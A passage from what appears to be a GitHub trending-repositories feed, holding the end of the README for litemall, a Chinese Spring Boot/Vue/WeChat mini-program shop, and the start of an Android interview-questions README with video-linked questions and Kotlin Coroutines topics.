&lt;/ul&gt; 
&lt;h2&gt;项目架构&lt;/h2&gt; 
&lt;p&gt;&lt;img src="https://raw.githubusercontent.com/linlinjava/litemall/master/doc/pics/readme/project-structure.png" alt="" /&gt;&lt;/p&gt; 
&lt;h2&gt;技术栈&lt;/h2&gt; 
&lt;blockquote&gt; 
 &lt;ol&gt; 
  &lt;li&gt;Spring Boot&lt;/li&gt; 
  &lt;li&gt;Vue&lt;/li&gt; 
  &lt;li&gt;微信小程序&lt;/li&gt; 
 &lt;/ol&gt; 
&lt;/blockquote&gt; 
&lt;p&gt;&lt;img src="https://raw.githubusercontent.com/linlinjava/litemall/master/doc/pics/readme/technology-stack.png" alt="" /&gt;&lt;/p&gt; 
&lt;h2&gt;功能&lt;/h2&gt; 
&lt;h3&gt;小商城功能&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;首页&lt;/li&gt; 
 &lt;li&gt;专题列表、专题详情&lt;/li&gt; 
 &lt;li&gt;分类列表、分类详情&lt;/li&gt; 
 &lt;li&gt;品牌列表、品牌详情&lt;/li&gt; 
 &lt;li&gt;新品首发、人气推荐&lt;/li&gt; 
 &lt;li&gt;优惠券列表、优惠券选择&lt;/li&gt; 
 &lt;li&gt;团购&lt;/li&gt; 
 &lt;li&gt;搜索&lt;/li&gt; 
 &lt;li&gt;商品详情、商品评价、商品分享&lt;/li&gt; 
 &lt;li&gt;购物车&lt;/li&gt; 
 &lt;li&gt;下单&lt;/li&gt; 
 &lt;li&gt;订单列表、订单详情、订单售后&lt;/li&gt; 
 &lt;li&gt;地址、收藏、足迹、意见反馈&lt;/li&gt; 
 &lt;li&gt;客服&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;管理平台功能&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;会员管理&lt;/li&gt; 
 &lt;li&gt;商城管理&lt;/li&gt; 
 &lt;li&gt;商品管理&lt;/li&gt; 
 &lt;li&gt;推广管理&lt;/li&gt; 
 &lt;li&gt;系统管理&lt;/li&gt; 
 &lt;li&gt;配置管理&lt;/li&gt; 
 &lt;li&gt;统计报表&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;快速启动&lt;/h2&gt; 
&lt;ol&gt; 
 &lt;li&gt; &lt;p&gt;配置最小开发环境：&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;&lt;a href="https://dev.mysql.com/downloads/mysql/"&gt;MySQL&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href="http://www.oracle.com/technetwork/java/javase/overview/index.html"&gt;JDK1.8或以上&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href="https://maven.apache.org/download.cgi"&gt;Maven&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href="https://nodejs.org/en/download/"&gt;Nodejs&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href="https://developers.weixin.qq.com/miniprogram/dev/devtools/download.html"&gt;微信开发者工具&lt;/a&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;数据库依次导入litemall-db/sql下的数据库文件&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;litemall_schema.sql&lt;/li&gt; 
   &lt;li&gt;litemall_table.sql&lt;/li&gt; 
   &lt;li&gt;litemall_data.sql&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;启动小商场和管理后台的后端服务&lt;/p&gt; &lt;p&gt;打开命令行，输入以下命令&lt;/p&gt; &lt;pre&gt;&lt;code class="language-bash"&gt;cd litemall
mvn install
mvn clean package
java -Dfile.encoding=UTF-8 -jar litemall-all/target/litemall-all-0.1.0-exec.jar
&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;启动管理后台前端&lt;/p&gt; &lt;p&gt;打开命令行，输入以下命令&lt;/p&gt; &lt;pre&gt;&lt;code class="language-bash"&gt;cd litemall/litemall-admin
npm install --registry=https://registry.npm.taobao.org
npm run dev
&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;此时，浏览器打开，输入网址&lt;code&gt;http://localhost:9527&lt;/code&gt;, 此时进入管理后台登录页面。&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;启动小商城前端&lt;/p&gt; &lt;p&gt;这里存在两套小商场前端litemall-wx和renard-wx，开发者可以分别导入和测试：&lt;/p&gt; 
  &lt;ol&gt; 
   &lt;li&gt;微信开发工具导入litemall-wx项目;&lt;/li&gt; 
   &lt;li&gt;项目配置，启用“不校验合法域名、web-view（业务域名）、TLS 版本以及 HTTPS 证书”&lt;/li&gt; 
   &lt;li&gt;点击“编译”，即可在微信开发工具预览效果；&lt;/li&gt; 
   &lt;li&gt;也可以点击“预览”，然后手机扫描登录（但是手机需开启调试功能）。&lt;/li&gt; 
  &lt;/ol&gt; &lt;p&gt;注意：&lt;/p&gt; 
  &lt;blockquote&gt; 
   &lt;p&gt;这里只是最简启动方式，而小商场的微信登录、微信支付等功能需开发者设置才能运行， 更详细方案请参考&lt;a href="https://linlinjava.gitbook.io/litemall/project"&gt;文档&lt;/a&gt;。&lt;/p&gt; 
  &lt;/blockquote&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;启动轻商城前端&lt;/p&gt; &lt;p&gt;打开命令行，输入以下命令&lt;/p&gt; &lt;pre&gt;&lt;code class="language-bash"&gt;cd litemall/litemall-vue
npm install --registry=https://registry.npm.taobao.org
npm run dev
&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;此时，浏览器（建议采用chrome 手机模式）打开，输入网址&lt;code&gt;http://localhost:6255&lt;/code&gt;, 此时进入轻商场。&lt;/p&gt; &lt;p&gt;注意：&lt;/p&gt; 
  &lt;blockquote&gt; 
   &lt;p&gt;现在功能很不稳定，处在开发阶段。&lt;/p&gt; 
  &lt;/blockquote&gt; &lt;/li&gt; 
&lt;/ol&gt; 
&lt;h2&gt;开发计划&lt;/h2&gt; 
&lt;p&gt;当前版本&lt;a href="https://linlinjava.gitbook.io/litemall/changelog"&gt;v1.8.0&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;目前项目开发中，存在诸多不足，以下是目前规划的开发计划。&lt;/p&gt; 
&lt;p&gt;V 1.0.0 完成以下目标：&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt;除了部分功能（如优惠券等），小商城的优化和改进基本结束；&lt;/li&gt; 
 &lt;li&gt;管理后台基本实现所有表的CRUD操作；&lt;/li&gt; 
 &lt;li&gt;后端服务能够对参数进行检验。&lt;/li&gt; 
&lt;/ol&gt; 
&lt;p&gt;V 2.0.0 完成以下目标：&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt;小商城和管理后台完成所有基本业务；&lt;/li&gt; 
 &lt;li&gt;管理后台实现统计功能、日志功能、权限功能；&lt;/li&gt; 
 &lt;li&gt;业务代码和细节代码进行调整优化；&lt;/li&gt; 
 &lt;li&gt;轻商城的开发；&lt;/li&gt; 
&lt;/ol&gt; 
&lt;p&gt;V 3.0.0 完成以下目标：&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt;管理后台一些辅助功能&lt;/li&gt; 
 &lt;li&gt;后端服务加强安全功能、配置功能&lt;/li&gt; 
 &lt;li&gt;缓存功能以及优化一些性能&lt;/li&gt; 
&lt;/ol&gt; 
&lt;h2&gt;警告&lt;/h2&gt; 
&lt;blockquote&gt; 
 &lt;ol&gt; 
  &lt;li&gt;本项目仅用于学习练习&lt;/li&gt; 
  &lt;li&gt;本项目还不完善，仍处在开发中，不承担任何使用后果&lt;/li&gt; 
  &lt;li&gt;本项目代码开源&lt;a href="https://raw.githubusercontent.com/linlinjava/litemall/master/LICENSE"&gt;MIT&lt;/a&gt;，项目文档采用 &lt;a href="https://creativecommons.org/licenses/by-nd/4.0/deed.zh"&gt;署名-禁止演绎 4.0 国际协议许可&lt;/a&gt;&lt;/li&gt; 
 &lt;/ol&gt; 
&lt;/blockquote&gt; 
&lt;h2&gt;致谢&lt;/h2&gt; 
&lt;p&gt;本项目基于或参考以下项目：&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt; &lt;p&gt;&lt;a href="https://github.com/tumobi/nideshop-mini-program"&gt;nideshop-mini-program&lt;/a&gt;&lt;/p&gt; &lt;p&gt;项目介绍：基于Node.js+MySQL开发的开源微信小程序商城（微信小程序）&lt;/p&gt; &lt;p&gt;项目参考：&lt;/p&gt; 
  &lt;ol&gt; 
   &lt;li&gt;litemall项目数据库基于nideshop-mini-program项目数据库；&lt;/li&gt; 
   &lt;li&gt;litemall项目的litemall-wx模块基于nideshop-mini-program开发。&lt;/li&gt; 
  &lt;/ol&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;a href="https://github.com/PanJiaChen/vue-element-admin"&gt;vue-element-admin&lt;/a&gt;&lt;/p&gt; &lt;p&gt;项目介绍： 一个基于Vue和Element的后台集成方案&lt;/p&gt; &lt;p&gt;项目参考：litemall项目的litemall-admin模块的前端框架基于vue-element-admin项目修改扩展。&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;a href="https://github.com/macrozheng/mall-admin-web"&gt;mall-admin-web&lt;/a&gt;&lt;/p&gt; &lt;p&gt;项目介绍：mall-admin-web是一个电商后台管理系统的前端项目，基于Vue+Element实现。&lt;/p&gt; &lt;p&gt;项目参考：litemall项目的litemall-admin模块的一些页面布局样式参考了mall-admin-web项目。&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;a href="https://github.com/CaiBaoHong/biu"&gt;biu&lt;/a&gt;&lt;/p&gt; &lt;p&gt;项目介绍：管理后台项目开发脚手架，基于vue-element-admin和springboot搭建，前后端分离方式开发和部署。&lt;/p&gt; &lt;p&gt;项目参考：litemall项目的权限管理功能参考了biu项目。&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;a href="https://github.com/qianzhaoy/vant--mobile-mall"&gt;vant--mobile-mall&lt;/a&gt;&lt;/p&gt; &lt;p&gt;项目介绍：基于有赞 vant 组件库的移动商城。&lt;/p&gt; &lt;p&gt;项目参考：litemall项目的litemall-vue模块基于vant--mobile-mall项目开发。&lt;/p&gt; &lt;/li&gt; 
&lt;/ol&gt; 
&lt;h2&gt;推荐&lt;/h2&gt; 
&lt;ol&gt; 
 &lt;li&gt; &lt;p&gt;&lt;a href="https://github.com/youxinLu/mall"&gt;Flutter_Mall&lt;/a&gt;&lt;/p&gt; &lt;p&gt;项目介绍：Flutter_Mall是一款Flutter开源在线商城应用程序。&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;a href="https://github.com/jiechud/taro-mall"&gt;Taro_Mall&lt;/a&gt;&lt;/p&gt; &lt;p&gt;项目介绍：Taro_Mall是一款多端开源在线商城应用程序，后台是基于litemall基础上进行开发，前端采用Taro框架编写。&lt;/p&gt; &lt;/li&gt; 
&lt;/ol&gt; 
&lt;h2&gt;问题&lt;/h2&gt; 
&lt;p&gt;&lt;img src="https://raw.githubusercontent.com/linlinjava/litemall/master/doc/pics/readme/qq4.png" alt="" /&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;开发者有问题或者好的建议可以用Issues反馈交流，请给出详细信息&lt;/li&gt; 
 &lt;li&gt;在开发交流群中应讨论开发、业务和合作问题&lt;/li&gt; 
 &lt;li&gt;如果真的需要QQ群里提问，请在提问前先完成以下过程： 
  &lt;ul&gt; 
   &lt;li&gt;请仔细阅读本项目文档，特别是是&lt;a href="https://linlinjava.gitbook.io/litemall/faq"&gt;&lt;strong&gt;FAQ&lt;/strong&gt;&lt;/a&gt;，查看能否解决；&lt;/li&gt; 
   &lt;li&gt;请阅读&lt;a href="https://github.com/ryanhanwu/How-To-Ask-Questions-The-Smart-Way/raw/master/README-zh_CN.md"&gt;提问的智慧&lt;/a&gt;；&lt;/li&gt; 
   &lt;li&gt;请百度或谷歌相关技术；&lt;/li&gt; 
   &lt;li&gt;请查看相关技术的官方文档，例如微信小程序的官方文档；&lt;/li&gt; 
   &lt;li&gt;请提问前尽可能做一些DEBUG或者思考分析，然后提问时给出详细的错误相关信息以及个人对问题的理解。&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;License&lt;/h2&gt; 
&lt;p&gt;&lt;a href="https://github.com/linlinjava/litemall/raw/master/LICENSE"&gt;MIT&lt;/a&gt; Copyright (c) 2018-present linlinjava&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>amitshekhariitbhu/android-interview-questions</title>
      <link>https://github.com/amitshekhariitbhu/android-interview-questions</link>
      <description>&lt;p&gt;Your Cheat Sheet For Android Interview - Android Interview Questions and Answers&lt;/p&gt;&lt;hr&gt;&lt;p align="center"&gt; &lt;img alt="Android Interview Questions" src="https://raw.githubusercontent.com/amitshekhariitbhu/android-interview-questions/master/assets/banner-android-interview-questions.jpg" /&gt; &lt;/p&gt; 
&lt;h1&gt;Android Interview Questions and Answers&lt;/h1&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;Android Interview Questions and Answers - Your Cheat Sheet For Android Interview&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;h3&gt;Prepared and maintained by the &lt;strong&gt;Founder&lt;/strong&gt; of &lt;a href="https://outcomeschool.com"&gt;Outcome School&lt;/a&gt;: Amit Shekhar&lt;/h3&gt; 
&lt;h2&gt;About me&lt;/h2&gt; 
&lt;p&gt;Hi, I am Amit Shekhar, Founder @ &lt;a href="https://outcomeschool.com"&gt;Outcome School&lt;/a&gt; • IIT 2010-14 • I have taught and mentored many developers, and their efforts landed them high-paying tech jobs, helped many tech companies in solving their unique problems, and created many open-source libraries being used by top companies. I am passionate about sharing knowledge through open-source, blogs, and videos.&lt;/p&gt; 
&lt;p&gt;You can connect with me on:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://x.com/amitiitbhu"&gt;X/Twitter&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/@amitshekhar"&gt;YouTube&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.linkedin.com/in/amit-shekhar-iitbhu"&gt;LinkedIn&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/amitshekhariitbhu"&gt;GitHub&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Live session on "Android Developer Interview Preparation for Product-based Companies"&lt;/h2&gt; 
&lt;p&gt;I conducted a live session on "Android Developer Interview Preparation for Product-based Companies"&lt;/p&gt; 
&lt;p&gt;Interacted with over &lt;strong&gt;500 Android Developers&lt;/strong&gt;.&lt;/p&gt; 
&lt;p&gt;Guided, motivated, and inspired them to aim higher and achieve more.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Recording Link&lt;/strong&gt;: &lt;a href="https://drive.google.com/file/d/1VWW3l_itH6vYbNYzNer6XW5_x0jzOF4O/view?usp=sharing"&gt;https://drive.google.com/file/d/1VWW3l_itH6vYbNYzNer6XW5_x0jzOF4O/view?usp=sharing&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Document Link&lt;/strong&gt;: &lt;a href="https://docs.google.com/document/d/14UdD7Gd1j3no583ALx2t2Ggt3G_CECYhenLE-m-bkzA/edit?usp=sharing"&gt;https://docs.google.com/document/d/14UdD7Gd1j3no583ALx2t2Ggt3G_CECYhenLE-m-bkzA/edit?usp=sharing&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;Contents - Android Interview Questions&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/amitshekhariitbhu/android-interview-questions/master/#android-interview-questions-and-answers-playlist"&gt;Android Interview Questions and Answers Playlist&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/amitshekhariitbhu/android-interview-questions/master/#kotlin-coroutines"&gt;Kotlin Coroutines&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/amitshekhariitbhu/android-interview-questions/master/#kotlin-flow-api"&gt;Kotlin Flow API&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/amitshekhariitbhu/android-interview-questions/master/#kotlin"&gt;Kotlin&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/amitshekhariitbhu/android-interview-questions/master/#android"&gt;Android&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/amitshekhariitbhu/android-interview-questions/master/#android-libraries"&gt;Android Libraries&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/amitshekhariitbhu/android-interview-questions/master/#android-architecture"&gt;Android Architecture&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/amitshekhariitbhu/android-interview-questions/master/#design-pattern"&gt;Design Pattern&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/amitshekhariitbhu/android-interview-questions/master/#android-system-design"&gt;Android System Design&lt;/a&gt; and check &lt;a href="https://outcomeschool.com/blog/android-system-design-interviews"&gt;Android System Design Interviews&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/amitshekhariitbhu/android-interview-questions/master/#android-unit-testing"&gt;Android Unit Testing&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/amitshekhariitbhu/android-interview-questions/master/#android-tools-and-technologies"&gt;Android Tools And Technologies&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/amitshekhariitbhu/android-interview-questions/master/#jetpack-compose"&gt;Jetpack Compose&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/amitshekhariitbhu/android-interview-questions/master/#java"&gt;Java&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/amitshekhariitbhu/android-interview-questions/master/#other-topics"&gt;Other Topics&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/amitshekhariitbhu/android-interview-questions/master/#data-structures-and-algorithms"&gt;Data Structures and Algorithms&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Android Interview Questions and Answers Playlist&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Question&lt;/strong&gt;: Android Push Notification Flow using FCM 
  &lt;ul&gt; 
   &lt;li&gt;&lt;strong&gt;Answer&lt;/strong&gt;: &lt;a href="https://www.youtube.com/watch?v=TrufwW4ILHg"&gt;Android Push Notification Flow using FCM&lt;/a&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Question&lt;/strong&gt;: What is an inline function in Kotlin? 
  &lt;ul&gt; 
   &lt;li&gt;&lt;strong&gt;Answer&lt;/strong&gt;: &lt;a href="https://www.youtube.com/watch?v=GLLI8h67ryo"&gt;What is an inline function in Kotlin?&lt;/a&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Question&lt;/strong&gt;: What is the advantage of using const in Kotlin? 
  &lt;ul&gt; 
   &lt;li&gt;&lt;strong&gt;Answer&lt;/strong&gt;: &lt;a href="https://www.youtube.com/watch?v=3G49ivVxfkU"&gt;What is the advantage of using const in Kotlin?&lt;/a&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Question&lt;/strong&gt;: What is a reified keyword in Kotlin? 
  &lt;ul&gt; 
   &lt;li&gt;&lt;strong&gt;Answer&lt;/strong&gt;: &lt;a href="https://www.youtube.com/watch?v=kD2T84FnTck"&gt;What is a reified keyword in Kotlin?&lt;/a&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Question&lt;/strong&gt;: Suspending vs Blocking in Kotlin Coroutines 
  &lt;ul&gt; 
   &lt;li&gt;&lt;strong&gt;Answer&lt;/strong&gt;: &lt;a href="https://www.youtube.com/watch?v=V2lL_aJp17I"&gt;Suspending vs Blocking in Kotlin Coroutines&lt;/a&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Question&lt;/strong&gt;: Launch vs Async in Kotlin Coroutines 
  &lt;ul&gt; 
   &lt;li&gt;&lt;strong&gt;Answer&lt;/strong&gt;: &lt;a href="https://www.youtube.com/watch?v=B4AfTPpCU5o"&gt;Launch vs Async in Kotlin Coroutines&lt;/a&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Question&lt;/strong&gt;: internal visibility modifier in Kotlin 
  &lt;ul&gt; 
   &lt;li&gt;&lt;strong&gt;Answer&lt;/strong&gt;: &lt;a href="https://www.youtube.com/watch?v=wOHpuf74-cI"&gt;internal visibility modifier in Kotlin&lt;/a&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Question&lt;/strong&gt;: open keyword in Kotlin 
  &lt;ul&gt; 
   &lt;li&gt;&lt;strong&gt;Answer&lt;/strong&gt;: &lt;a href="https://www.youtube.com/watch?v=bfpNDWNE6I0"&gt;open keyword in Kotlin&lt;/a&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Question&lt;/strong&gt;: lateinit vs lazy in Kotlin 
  &lt;ul&gt; 
   &lt;li&gt;&lt;strong&gt;Answer&lt;/strong&gt;: &lt;a href="https://www.youtube.com/watch?v=IU2ZktdM-fo"&gt;lateinit vs lazy in Kotlin&lt;/a&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Question&lt;/strong&gt;: What is Multidex in Android? 
  &lt;ul&gt; 
   &lt;li&gt;&lt;strong&gt;Answer&lt;/strong&gt;: &lt;a href="https://www.youtube.com/watch?v=R0zd8lmHnmE"&gt;What is Multidex in Android?&lt;/a&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Question&lt;/strong&gt;: How does the Android Push Notification system work? 
  &lt;ul&gt; 
   &lt;li&gt;&lt;strong&gt;Answer&lt;/strong&gt;: &lt;a href="https://www.youtube.com/watch?v=810IFG2sWlc"&gt;How does the Android Push Notification system work?&lt;/a&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Question&lt;/strong&gt;: How does the Kotlin Multiplatform work? 
  &lt;ul&gt; 
   &lt;li&gt;&lt;strong&gt;Answer&lt;/strong&gt;: &lt;a href="https://www.youtube.com/watch?v=nwfNh6Kd5hI"&gt;How does the Kotlin Multiplatform work?&lt;/a&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Question&lt;/strong&gt;: What is a ViewModel and how is it useful? 
  &lt;ul&gt; 
   &lt;li&gt;&lt;strong&gt;Answer&lt;/strong&gt;: &lt;a href="https://www.youtube.com/watch?v=ORtieK5f_zg"&gt;What is a ViewModel and how is it useful?&lt;/a&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Question&lt;/strong&gt;: Is it possible to force the Garbage Collection in Android? 
  &lt;ul&gt; 
   &lt;li&gt;&lt;strong&gt;Answer&lt;/strong&gt;: &lt;a href="https://www.youtube.com/watch?v=fPEjpFKo1-Q"&gt;Is it possible to force Garbage Collection in Android?&lt;/a&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Question&lt;/strong&gt;: What is a JvmStatic Annotation in Kotlin? 
  &lt;ul&gt; 
   &lt;li&gt;&lt;strong&gt;Answer&lt;/strong&gt;: &lt;a href="https://www.youtube.com/watch?v=qBBbOhY_pv4"&gt;What is a JvmStatic Annotation in Kotlin?&lt;/a&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Question&lt;/strong&gt;: init block in Kotlin 
  &lt;ul&gt; 
   &lt;li&gt;&lt;strong&gt;Answer&lt;/strong&gt;: &lt;a href="https://www.youtube.com/watch?v=cb3jOFozJns"&gt;init block in Kotlin&lt;/a&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Question&lt;/strong&gt;: JvmField Annotation in Kotlin 
  &lt;ul&gt; 
   &lt;li&gt;&lt;strong&gt;Answer&lt;/strong&gt;: &lt;a href="https://www.youtube.com/watch?v=bx8OZcMbeUE"&gt;JvmField Annotation in Kotlin&lt;/a&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Question&lt;/strong&gt;: singleTask launchMode in Android 
  &lt;ul&gt; 
   &lt;li&gt;&lt;strong&gt;Answer&lt;/strong&gt;: &lt;a href="https://www.youtube.com/watch?v=WYkQEnm4jeI"&gt;singleTask launchMode in Android&lt;/a&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Question&lt;/strong&gt;: Difference between == and === in Kotlin 
  &lt;ul&gt; 
   &lt;li&gt;&lt;strong&gt;Answer&lt;/strong&gt;: &lt;a href="https://www.youtube.com/watch?v=lJtgxT2OIgQ"&gt;Difference between == and === in Kotlin&lt;/a&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Question&lt;/strong&gt;: JvmOverloads Annotation in Kotlin 
  &lt;ul&gt; 
   &lt;li&gt;&lt;strong&gt;Answer&lt;/strong&gt;: &lt;a href="https://www.youtube.com/watch?v=fHGsBV9Za8M"&gt;JvmOverloads Annotation in Kotlin&lt;/a&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Question&lt;/strong&gt;: Why is it recommended to use only the default constructor to create a Fragment? 
  &lt;ul&gt; 
   &lt;li&gt;&lt;strong&gt;Answer&lt;/strong&gt;: &lt;a href="https://www.youtube.com/watch?v=CitBt0FZFIc"&gt;Why is it recommended to use only the default constructor to create a Fragment?&lt;/a&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Question&lt;/strong&gt;: Why do we need to call setContentView() in onCreate() of Activity class? 
  &lt;ul&gt; 
   &lt;li&gt;&lt;strong&gt;Answer&lt;/strong&gt;: &lt;a href="https://www.youtube.com/watch?v=U1aHAt7XC5I"&gt;Why do we need to call setContentView() in onCreate() of Activity class?&lt;/a&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Question&lt;/strong&gt;: When only onDestroy is called for an activity without onPause() and onStop()? 
  &lt;ul&gt; 
   &lt;li&gt;&lt;strong&gt;Answer&lt;/strong&gt;: &lt;a href="https://www.youtube.com/watch?v=B2kY_ckZa-g"&gt;When only onDestroy is called for an activity without onPause() and onStop()?&lt;/a&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Kotlin Coroutines&lt;/h3&gt; 
&lt;p&gt;Topics you should know in &lt;strong&gt;Kotlin Coroutines&lt;/strong&gt; for Android Interview:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;coroutines&lt;/li&gt; 
 &lt;li&gt;suspend&lt;/li&gt; 
 &lt;li&gt;launch, async-await, withContext&lt;/li&gt; 
 &lt;li&gt;dispatchers&lt;/li&gt; 
 &lt;li&gt;scope, context, job&lt;/li&gt; 
 &lt;li&gt;lifecycleScope, viewModelScope, GlobalScope&lt;/li&gt; 
 &lt;li&gt;suspendCoroutine, suspendCancellableCoroutine&lt;/li&gt; 
 &lt;li&gt;coroutineScope, supervisorScope&lt;/li&gt; 
 &lt;li&gt;runBlocking&lt;/li&gt; 
 &lt;li&gt;Exception Handling&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Learn the above-mentioned from the following links:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://outcomeschool.com/blog/kotlin-coroutines"&gt;Master Kotlin Coroutines&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=V2lL_aJp17I"&gt;Suspending vs Blocking in Kotlin Coroutines&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=B4AfTPpCU5o"&gt;Launch vs Async in Kotlin Coroutines&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://outcomeschool.com/blog/dispatchers-in-kotlin-coroutines"&gt;Dispatchers in Kotlin Coroutines&lt;/a&gt;&lt;/li&gt; 
